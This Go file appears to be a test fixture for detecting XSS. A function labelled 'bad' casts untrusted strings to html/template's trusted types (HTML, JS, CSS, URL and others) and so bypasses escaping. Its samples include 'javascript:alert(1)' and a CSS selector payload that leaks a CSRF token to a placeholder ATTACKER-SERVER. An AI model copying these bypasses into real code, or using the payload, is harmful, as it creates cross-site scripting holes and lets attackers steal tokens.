package main

import (
	"html/template"
	"os"
)

func main() {}
func source(s string) string {
	return s
}

type HTMLAlias = template.HTML

func checkError(err error) {
	if err != nil {
		panic(err)
	}
}

// bad is an example of a bad implementation
func bad() {
	tmpl, _ := template.New("test").Parse(`Hi {{.}}\n`)
	tmplTag, _ := template.New("test").Parse(`Hi <b {{.}}></b>\n`)
	tmplScript, _ := template.New("test").Parse(`<script> eval({{.}}) </script>`)
	tmplSrcset, _ := template.New("test").Parse(`<img srcset="{{.}}"/>`)

	{
		{
			var a = template.HTML(source(`<a href='example.com'>link</a>`))
			checkError(tmpl.Execute(os.Stdout, a))
		}
		{
			{
				var a template.HTML
				a = template.HTML(source(`<a href='example.com'>link</a>`))
				checkError(tmpl.Execute(os.Stdout, a))
			}
			{
				var a HTMLAlias
				a = HTMLAlias(source(`<a href='example.com'>link</a>`))
				checkError(tmpl.Execute(os.Stdout, a))
			}
		}
	}
	{
		var c = template.HTMLAttr(source(`href="https://example.com"`))
		checkError(tmplTag.Execute(os.Stdout, c))
	}
	{
		var d = template.JS(source("alert({hello: 'world'})"))
		checkError(tmplScript.Execute(os.Stdout, d))
	}
	{
		var e = template.JSStr(source("setTimeout('alert()')"))
		checkError(tmplScript.Execute(os.Stdout, e))
	}
	{
		var b = template.CSS(source("input[name='csrftoken'][value^='b'] { background: url(//ATTACKER-SERVER/leak/b); } "))
		checkError(tmpl.Execute(os.Stdout, b))
	}
	{
		var f = template.Srcset(source(`evil.jpg 320w`))
		checkError(tmplSrcset.Execute(os.Stdout, f))
	}
	{
		var g = template.URL(source("javascript:alert(1)"))
		checkError(tmpl.Execute(os.Stdout, g))
	}
}
